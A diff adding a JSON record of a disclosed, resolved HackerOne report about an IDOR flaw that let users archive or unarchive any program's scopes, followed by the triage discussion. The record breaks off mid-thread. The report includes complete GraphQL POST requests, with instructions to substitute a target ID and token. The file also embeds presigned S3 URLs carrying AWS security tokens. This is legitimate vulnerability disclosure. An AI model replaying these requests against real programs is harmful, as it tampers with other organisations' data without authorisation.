@@ -1,0 +1,970 @@
+{
+    "id": 1501611,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTAxNjEx",
+    "url": "https://hackerone.com/reports/1501611",
+    "title": "An attacker can archive and unarchive any structured scope object on HackerOne",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "high",
+    "readable_substate": "Resolved",
+    "created_at": "2022-03-05T22:21:29.932Z",
+    "submitted_at": "2022-03-05T22:21:30.013Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "ahacker1",
+        "url": "/ahacker1",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/vllgks9w6232xyo136ujj5cbt47w/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 13,
+        "url": "https://hackerone.com/security",
+        "handle": "security",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "HackerOne",
+            "twitter_handle": "Hacker0x01",
+            "website": "https://hackerone.com",
+            "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+        }
+    },
+    "has_bounty?": true,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": false,
+    "disclosed_at": "2022-04-18T18:22:22.857Z",
+    "bug_reporter_agreed_on_going_public_at": "2022-04-08T02:13:48.973Z",
+    "team_member_agreed_on_going_public_at": "2022-04-18T18:22:21.640Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "**Summary:**\nHello, I have discovered an IDOR vulnerability that allows the scope of any program to be archived. Scopes are used to give information about the valid scopes of a program. For example HackerOne has the following scopes:\nhttps://hackerone.com\nhttps://api.hackerone.com\n...\n\n### Steps To Reproduce\n\n1. Obtain the structured_scope_id: \nThis can be found by base64 encoding: gid://hackerone/StructuredScope/NUMBER\nFor example, if the number was 94773 , the structered_scope_id would be Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw==\nOr, it could be found by intercepting the response of the program profile page.\n\n2. Send the Following Request:\n``` \nPOST /graphql HTTP/2\nHost: hackerone.com\nContent-Length: 388\nSec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"\nAccept: */*\nX-Auth-Token: AUTHTOKEN\nContent-Type: application/json\nOrigin: https://hackerone.com\nReferer: https://hackerone.com/hackerone_com_h1b/scopes/94774/edit\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7\n\n{\"operationName\":\"ArchiveScope\",\"variables\":{\"structured_scope_id\":\"Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw==\"},\"query\":\"mutation ArchiveScope($structured_scope_id: ID!) {\\n  archiveStructuredScope(input: {structured_scope_id: $structured_scope_id}) {\\n    was_successful\\n    structured_scope {\\n      id\\n      archived_at\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"}\n```\nIt is also possible to unarchive scopes of other programs with the following request.:\n```\nPOST /graphql HTTP/2\nHost: hackerone.com\nContent-Length: 414\nSec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"\nAccept: */*\nX-Auth-Token: ████\nContent-Type: application/json\nOrigin: https://hackerone.com\nReferer: https://hackerone.com/hackerone_com_h1b/scopes/94774/edit\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7\n\n{\"operationName\":\"UnarchiveStructuredScope\",\"variables\":{\"structured_scope_id\":\"Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw==\"},\"query\":\"mutation UnarchiveStructuredScope($structured_scope_id: ID!) {\\n  unarchiveStructuredScope(input: {structured_scope_id: $structured_scope_id}) {\\n    was_successful\\n    structured_scope {\\n      id\\n      archived_at\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"}\n```\nEven though the response will say no structured scope exists, the scope will be archived.\nReplace the structured_scope_id with the scope you wish to target and the X-Auth-Token with your token.\nI will provide an Mp4 PoC soon.\n\n## Impact\n\nAn attacker could archive or unarchive all 90000+ scopes on HackerOne.",
+    "bounty_amount": "12500.0",
+    "formatted_bounty": "$12,500",
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [],
+    "allow_singular_disclosure_at": "2022-05-08T02:13:49.085Z",
+    "allow_singular_disclosure_after": -41316508.53420419,
+    "singular_disclosure_allowed": true,
+    "vote_count": 296,
+    "voters": [
+        "neeythann",
+        "cucumbersalad",
+        "tgadams",
+        "rondons",
+        "njmulsqb",
+        "xenx",
+        "bisesh",
+        "p4n7h3rx",
+        "jumpydata",
+        "kathulu",
+        "and 286 more..."
+    ],
+    "severity": {
+        "rating": "high",
+        "author_type": "User"
+    },
+    "structured_scope": {
+        "databaseId": 3,
+        "asset_type": "URL",
+        "asset_identifier": "hackerone.com",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 15755805,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Mp4 PoC",
+            "automated_response": false,
+            "created_at": "2022-03-05T22:23:46.618Z",
+            "updated_at": "2022-03-05T22:23:46.618Z",
+            "actor": {
+                "username": "ahacker1",
+                "cleared": false,
+                "verified": false,
+                "url": "/ahacker1",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/vllgks9w6232xyo136ujj5cbt47w/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 15755808,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": ":",
+            "automated_response": false,
+            "created_at": "2022-03-05T22:26:50.817Z",
+            "updated_at": "2022-03-05T22:26:50.817Z",
+            "actor": {
+                "username": "ahacker1",
+                "cleared": false,
+                "verified": false,
+                "url": "/ahacker1",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/vllgks9w6232xyo136ujj5cbt47w/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 15784445,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I have also found that the following endpoint: https://api.hackerone.com/customer-resources/?javascript#programs-archive-structured-scope\nis vulnerable to the same vulnerability.",
+            "automated_response": false,
+            "created_at": "2022-03-08T01:57:03.494Z",
+            "updated_at": "2022-03-08T01:57:03.494Z",
+            "actor": {
+                "username": "ahacker1",
+                "cleared": false,
+                "verified": false,
+                "url": "/ahacker1",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/vllgks9w6232xyo136ujj5cbt47w/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 15785930,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @ahacker1,\n\nThank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nHave a great day! \n\nKind regards,\n@cool_wave",
+            "automated_response": false,
+            "created_at": "2022-03-08T07:42:08.594Z",
+            "updated_at": "2022-03-08T07:42:08.594Z",
+            "actor": {
+                "username": "h1_analyst_grace",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_grace",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/r2xlydcui5w3ttamd7hq3kclygla/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22wave2.jpg%22%3B%20filename%2A%3DUTF-8%27%27wave2.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUR2ZSYPL%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070217Z&X-Amz-Expires=1199&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCuJ7GGKM7kIZUlE%2BEjrt%2Bxv5BG%2Fd%2F6MZdNdXaAdLbypAIgWhnU6okSPCcwU2VK%2BkQwglklOGyuwTSp8e0XgpiaTsMquwUImv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCxq6aFU7nsH%2B6tVECqPBYfRIb1SThCbd1maLSA%2Bz34g%2Bwh%2B0kLpyIzK8gI1I376Nfiqm4jzHZin%2Fi1t9CbVntbcdVUKpl5LBomGC0biywH2qmIDQYHf%2B4Ivdm4qJgeYjBFkVjXXaGrGIHVjm4Qm5vbSgTAqTkhTdRAkAkbHHUGl2LTf5yXK8qQ3MO9rzxQ6jcKMn31IIHPSGMpQ8Pc%2ByHvNCTtzjjy2Fj1BGiWx9r9MQ82VbipBPKywpGx71D3bfxbOAIe6jbk6DN60zvDpMZh%2BbhfkjNXMqCjkTt6chd2%2BmdWqYwN7tjqN7hCnmfKFcO%2FZM%2FND7d9ihU14L0e7fUYaP9ttwDTRSzHNWQKhbLdIPUeCkr6jUknEaom4MsGV6hp5FRyrmf5XaSLIQPROIveYcyCmH%2B9bLkSG1%2FJc%2Byha0BDRydwqtkJHgGPwKFhoo5yPxGKyyanGWMmNXfmPMV%2FBnO2i3nUNmQVRz009ACtL1aWD3LFdxWCn3GN8UA1%2Frjv8TCFgaXA7ZjUtQqf%2Bg1B%2F0mfgiZ9PxUj%2BR2XNIQO3RfPKE0b6uQdmnu85EJrWcIccSqndUSSZrGk%2F4%2FkGYD1Etg6l6IlQqxLOqGwJiYjjI6lf74d71xjdgh2l4pP8QOknOj%2Fyr7CkHtRRt0ujdKmW0BwwkJXxuYSdnQJTyFsVChUZGVXmTiRbYiizTg8sJf6YYQHNXgWw4Oh1KhYXFgQbHVcs%2FX95SDxAlFiOOE08k9RSYETfDpIwmwEkyAyLcBJCcD%2Bsu2hhI%2Fit1J%2BktZAnq9eCTmWVsPM9tXGsX1b0jSb9sb6lecY6usDkO0tuAdnZ0%2B8pbrZuVqjyTKfdZL4aeZIuOlTLkpr7OsCUEQ8aEJGJZx8at6H5wF1mYnIwyYK1pwY6sQHa9NWtSr124WBteOMuZ0gRxs4h7%2B45MQ4Jajx54ZYNp3CzErjQsi074sjhlC%2BgUdUkdv9AJ%2FXnIjscPmbEAOBS1ezvurw3cyM4cDGTs0DFCEF4mtFK3UsBx8CsE0ACWlzoXkcfZWltI2e4mWNuLQrhAKsm7Lpp2%2B23Qc88gL8I%2BFFlGmA68WBDP9ucnEldjgnESenwlTYaBCrPUv9ZnIwNPzlW5RAFvpGY%2BRPFLPWOHC0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bb863b07ac4153c17514403df7a9ac79e1736fe0acf153ec43894922fc0dd0d8"
+                },
+                "hackerone_triager": true,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 15785951,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugInformative",
+            "message": "Hi @ahacker1,\n\nAlthough your finding might appear to be a security vulnerability, after reviewing your submission it appears this behavior does not pose a concrete and exploitable risk to the platform in and on itself. If you're able to demonstrate any impact please let us know, and provide an accompanying working exploit.\n\nYour effort is nonetheless appreciated and we wish that you’ll continue to research, and submit any future security issues you find.\n\nKind regards,\n@cool_wave",
+            "automated_response": false,
+            "created_at": "2022-03-08T07:43:53.586Z",
+            "updated_at": "2022-03-08T07:43:53.586Z",
+            "actor": {
+                "username": "h1_analyst_grace",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_grace",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/r2xlydcui5w3ttamd7hq3kclygla/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22wave2.jpg%22%3B%20filename%2A%3DUTF-8%27%27wave2.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUR2ZSYPL%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070217Z&X-Amz-Expires=1199&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCuJ7GGKM7kIZUlE%2BEjrt%2Bxv5BG%2Fd%2F6MZdNdXaAdLbypAIgWhnU6okSPCcwU2VK%2BkQwglklOGyuwTSp8e0XgpiaTsMquwUImv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCxq6aFU7nsH%2B6tVECqPBYfRIb1SThCbd1maLSA%2Bz34g%2Bwh%2B0kLpyIzK8gI1I376Nfiqm4jzHZin%2Fi1t9CbVntbcdVUKpl5LBomGC0biywH2qmIDQYHf%2B4Ivdm4qJgeYjBFkVjXXaGrGIHVjm4Qm5vbSgTAqTkhTdRAkAkbHHUGl2LTf5yXK8qQ3MO9rzxQ6jcKMn31IIHPSGMpQ8Pc%2ByHvNCTtzjjy2Fj1BGiWx9r9MQ82VbipBPKywpGx71D3bfxbOAIe6jbk6DN60zvDpMZh%2BbhfkjNXMqCjkTt6chd2%2BmdWqYwN7tjqN7hCnmfKFcO%2FZM%2FND7d9ihU14L0e7fUYaP9ttwDTRSzHNWQKhbLdIPUeCkr6jUknEaom4MsGV6hp5FRyrmf5XaSLIQPROIveYcyCmH%2B9bLkSG1%2FJc%2Byha0BDRydwqtkJHgGPwKFhoo5yPxGKyyanGWMmNXfmPMV%2FBnO2i3nUNmQVRz009ACtL1aWD3LFdxWCn3GN8UA1%2Frjv8TCFgaXA7ZjUtQqf%2Bg1B%2F0mfgiZ9PxUj%2BR2XNIQO3RfPKE0b6uQdmnu85EJrWcIccSqndUSSZrGk%2F4%2FkGYD1Etg6l6IlQqxLOqGwJiYjjI6lf74d71xjdgh2l4pP8QOknOj%2Fyr7CkHtRRt0ujdKmW0BwwkJXxuYSdnQJTyFsVChUZGVXmTiRbYiizTg8sJf6YYQHNXgWw4Oh1KhYXFgQbHVcs%2FX95SDxAlFiOOE08k9RSYETfDpIwmwEkyAyLcBJCcD%2Bsu2hhI%2Fit1J%2BktZAnq9eCTmWVsPM9tXGsX1b0jSb9sb6lecY6usDkO0tuAdnZ0%2B8pbrZuVqjyTKfdZL4aeZIuOlTLkpr7OsCUEQ8aEJGJZx8at6H5wF1mYnIwyYK1pwY6sQHa9NWtSr124WBteOMuZ0gRxs4h7%2B45MQ4Jajx54ZYNp3CzErjQsi074sjhlC%2BgUdUkdv9AJ%2FXnIjscPmbEAOBS1ezvurw3cyM4cDGTs0DFCEF4mtFK3UsBx8CsE0ACWlzoXkcfZWltI2e4mWNuLQrhAKsm7Lpp2%2B23Qc88gL8I%2BFFlGmA68WBDP9ucnEldjgnESenwlTYaBCrPUv9ZnIwNPzlW5RAFvpGY%2BRPFLPWOHC0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bb863b07ac4153c17514403df7a9ac79e1736fe0acf153ec43894922fc0dd0d8"
+                },
+                "hackerone_triager": true,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 15791404,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hello,\nScopes are an important component of Hackerone as they give important information to a hacker. By archiving the scope, a hacker is no longer able to see which assets they are able to hack or is in scope. Similarly, by unarchiving a scope, a hacker will believe that they are allowed to hack that scope. To demonstrate this impact, I archived, then quickly unarchived one of the scopes on your team. The proof for this is here: https://hackerone.com/security/scope_versions?type=team",
+            "automated_response": false,
+            "created_at": "2022-03-08T12:45:16.846Z",
+            "updated_at": "2022-03-08T12:45:16.846Z",
+            "actor": {
+                "username": "ahacker1",
+                "cleared": false,
+                "verified": false,
+                "url": "/ahacker1",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/vllgks9w6232xyo136ujj5cbt47w/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 15854217,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I have created a team to demonstrate the impact of archiving a scope.\nBelow are 2 screenshots of the team before the attacker archives the scope of a victim's team:\nPolicy Page Screenshot:\n███████\nSubmission form screenshot:\n██████████\nHere is are the screenshots of the page after all the scopes of the team have been archived:\nPolicy Page:\n███\nNotice how there are no scopes listed on the team page.\nSubmission Form:\n███\nA hacker cannot choose which asset they hacked in the submission form.\n\nVery clearly, there is a significant impact on a team after the scopes have been archived.\nHere is the old Mp4 PoC of this:\n██████████\n(different scopes are used, but it nonetheless demonstrates the impact)\n\n\n\n\n",
+            "automated_response": false,
+            "created_at": "2022-03-13T03:55:57.154Z",
+            "updated_at": "2022-04-18T18:17:49.431Z",
+            "actor": {
+                "username": "ahacker1",
+                "cleared": false,
+                "verified": false,
+                "url": "/ahacker1",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/vllgks9w6232xyo136ujj5cbt47w/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 15867517,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @ahacker1,\n\nI hope all is well at your end and thanks for leaving a message!\n\nThis would only archive or unarchive the scope for your own program (that is created and owned by you). As such, there doesn’t seem to be any security risk and/or security impact as a result of the behavior you are describing since there is no way that an attacker would be able to benefit from this. This is also not affecting end-users or the application infrastructure.\n\nIf you are able to leverage this into a practical exploitation scenario, we will be happy to reevaluate this report.\nThank you and have a great day!\n\nKind regards,\n@cool_wave",
+            "automated_response": false,
+            "created_at": "2022-03-14T10:51:26.441Z",
+            "updated_at": "2022-03-14T10:51:26.441Z",
+            "actor": {
+                "username": "h1_analyst_grace",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_grace",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/r2xlydcui5w3ttamd7hq3kclygla/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22wave2.jpg%22%3B%20filename%2A%3DUTF-8%27%27wave2.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUR2ZSYPL%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070217Z&X-Amz-Expires=1199&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCuJ7GGKM7kIZUlE%2BEjrt%2Bxv5BG%2Fd%2F6MZdNdXaAdLbypAIgWhnU6okSPCcwU2VK%2BkQwglklOGyuwTSp8e0XgpiaTsMquwUImv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCxq6aFU7nsH%2B6tVECqPBYfRIb1SThCbd1maLSA%2Bz34g%2Bwh%2B0kLpyIzK8gI1I376Nfiqm4jzHZin%2Fi1t9CbVntbcdVUKpl5LBomGC0biywH2qmIDQYHf%2B4Ivdm4qJgeYjBFkVjXXaGrGIHVjm4Qm5vbSgTAqTkhTdRAkAkbHHUGl2LTf5yXK8qQ3MO9rzxQ6jcKMn31IIHPSGMpQ8Pc%2ByHvNCTtzjjy2Fj1BGiWx9r9MQ82VbipBPKywpGx71D3bfxbOAIe6jbk6DN60zvDpMZh%2BbhfkjNXMqCjkTt6chd2%2BmdWqYwN7tjqN7hCnmfKFcO%2FZM%2FND7d9ihU14L0e7fUYaP9ttwDTRSzHNWQKhbLdIPUeCkr6jUknEaom4MsGV6hp5FRyrmf5XaSLIQPROIveYcyCmH%2B9bLkSG1%2FJc%2Byha0BDRydwqtkJHgGPwKFhoo5yPxGKyyanGWMmNXfmPMV%2FBnO2i3nUNmQVRz009ACtL1aWD3LFdxWCn3GN8UA1%2Frjv8TCFgaXA7ZjUtQqf%2Bg1B%2F0mfgiZ9PxUj%2BR2XNIQO3RfPKE0b6uQdmnu85EJrWcIccSqndUSSZrGk%2F4%2FkGYD1Etg6l6IlQqxLOqGwJiYjjI6lf74d71xjdgh2l4pP8QOknOj%2Fyr7CkHtRRt0ujdKmW0BwwkJXxuYSdnQJTyFsVChUZGVXmTiRbYiizTg8sJf6YYQHNXgWw4Oh1KhYXFgQbHVcs%2FX95SDxAlFiOOE08k9RSYETfDpIwmwEkyAyLcBJCcD%2Bsu2hhI%2Fit1J%2BktZAnq9eCTmWVsPM9tXGsX1b0jSb9sb6lecY6usDkO0tuAdnZ0%2B8pbrZuVqjyTKfdZL4aeZIuOlTLkpr7OsCUEQ8aEJGJZx8at6H5wF1mYnIwyYK1pwY6sQHa9NWtSr124WBteOMuZ0gRxs4h7%2B45MQ4Jajx54ZYNp3CzErjQsi074sjhlC%2BgUdUkdv9AJ%2FXnIjscPmbEAOBS1ezvurw3cyM4cDGTs0DFCEF4mtFK3UsBx8CsE0ACWlzoXkcfZWltI2e4mWNuLQrhAKsm7Lpp2%2B23Qc88gL8I%2BFFlGmA68WBDP9ucnEldjgnESenwlTYaBCrPUv9ZnIwNPzlW5RAFvpGY%2BRPFLPWOHC0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bb863b07ac4153c17514403df7a9ac79e1736fe0acf153ec43894922fc0dd0d8"
+                },
+                "hackerone_triager": true,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 15874948,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "In the Mp4 PoC, I showed that I was able to archive the scopes of another program. In the first half of the video, I demonstrated how the endpoint works. In the second half of the video, I archived the scope of another program, a testing team. \nTo demonstrate the exploit, I ask for permission from HackerOne, to archive one of the scopes in the team.",
+            "automated_response": false,
+            "created_at": "2022-03-14T13:34:49.020Z",
+            "updated_at": "2022-03-14T13:34:49.020Z",
+            "actor": {
+                "username": "ahacker1",
+                "cleared": false,
+                "verified": false,
+                "url": "/ahacker1",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/vllgks9w6232xyo136ujj5cbt47w/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 15875910,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @ahacker1,\n\nI hope all is well at your end and thanks for leaving a message!\n\nIn the video PoC, you were only able to archive the programs which were owned by you. \n\nTo confirm this, perform the following actions on any report of your created program:\n+ Invite another user to that report\n+ In another browser login as the invited user\n+ Try to archive the program scope as the second user\n\nYou will not be able to do so. Thus, there is no security impact here.\n\nIf you are able to Archive any program which you don't own please let us know.\nThank you and have a great day!\n\nKind regards,\n@cool_wave\n",
+            "automated_response": false,
+            "created_at": "2022-03-14T14:54:18.029Z",
+            "updated_at": "2022-03-14T14:54:18.029Z",
+            "actor": {
+                "username": "h1_analyst_grace",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_grace",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/r2xlydcui5w3ttamd7hq3kclygla/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22wave2.jpg%22%3B%20filename%2A%3DUTF-8%27%27wave2.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUR2ZSYPL%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070217Z&X-Amz-Expires=1199&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCuJ7GGKM7kIZUlE%2BEjrt%2Bxv5BG%2Fd%2F6MZdNdXaAdLbypAIgWhnU6okSPCcwU2VK%2BkQwglklOGyuwTSp8e0XgpiaTsMquwUImv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCxq6aFU7nsH%2B6tVECqPBYfRIb1SThCbd1maLSA%2Bz34g%2Bwh%2B0kLpyIzK8gI1I376Nfiqm4jzHZin%2Fi1t9CbVntbcdVUKpl5LBomGC0biywH2qmIDQYHf%2B4Ivdm4qJgeYjBFkVjXXaGrGIHVjm4Qm5vbSgTAqTkhTdRAkAkbHHUGl2LTf5yXK8qQ3MO9rzxQ6jcKMn31IIHPSGMpQ8Pc%2ByHvNCTtzjjy2Fj1BGiWx9r9MQ82VbipBPKywpGx71D3bfxbOAIe6jbk6DN60zvDpMZh%2BbhfkjNXMqCjkTt6chd2%2BmdWqYwN7tjqN7hCnmfKFcO%2FZM%2FND7d9ihU14L0e7fUYaP9ttwDTRSzHNWQKhbLdIPUeCkr6jUknEaom4MsGV6hp5FRyrmf5XaSLIQPROIveYcyCmH%2B9bLkSG1%2FJc%2Byha0BDRydwqtkJHgGPwKFhoo5yPxGKyyanGWMmNXfmPMV%2FBnO2i3nUNmQVRz009ACtL1aWD3LFdxWCn3GN8UA1%2Frjv8TCFgaXA7ZjUtQqf%2Bg1B%2F0mfgiZ9PxUj%2BR2XNIQO3RfPKE0b6uQdmnu85EJrWcIccSqndUSSZrGk%2F4%2FkGYD1Etg6l6IlQqxLOqGwJiYjjI6lf74d71xjdgh2l4pP8QOknOj%2Fyr7CkHtRRt0ujdKmW0BwwkJXxuYSdnQJTyFsVChUZGVXmTiRbYiizTg8sJf6YYQHNXgWw4Oh1KhYXFgQbHVcs%2FX95SDxAlFiOOE08k9RSYETfDpIwmwEkyAyLcBJCcD%2Bsu2hhI%2Fit1J%2BktZAnq9eCTmWVsPM9tXGsX1b0jSb9sb6lecY6usDkO0tuAdnZ0%2B8pbrZuVqjyTKfdZL4aeZIuOlTLkpr7OsCUEQ8aEJGJZx8at6H5wF1mYnIwyYK1pwY6sQHa9NWtSr124WBteOMuZ0gRxs4h7%2B45MQ4Jajx54ZYNp3CzErjQsi074sjhlC%2BgUdUkdv9AJ%2FXnIjscPmbEAOBS1ezvurw3cyM4cDGTs0DFCEF4mtFK3UsBx8CsE0ACWlzoXkcfZWltI2e4mWNuLQrhAKsm7Lpp2%2B23Qc88gL8I%2BFFlGmA68WBDP9ucnEldjgnESenwlTYaBCrPUv9ZnIwNPzlW5RAFvpGY%2BRPFLPWOHC0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bb863b07ac4153c17514403df7a9ac79e1736fe0acf153ec43894922fc0dd0d8"
+                },
+                "hackerone_triager": true,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 15875954,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Previously, I archived, then unarchived one of the scopes of the HackerOne team. \nThe proof is here: https://hackerone.com/security/scope_versions?change=155730&type=team\nIf needed, I can do it again.",
+            "automated_response": false,
+            "created_at": "2022-03-14T14:56:38.224Z",
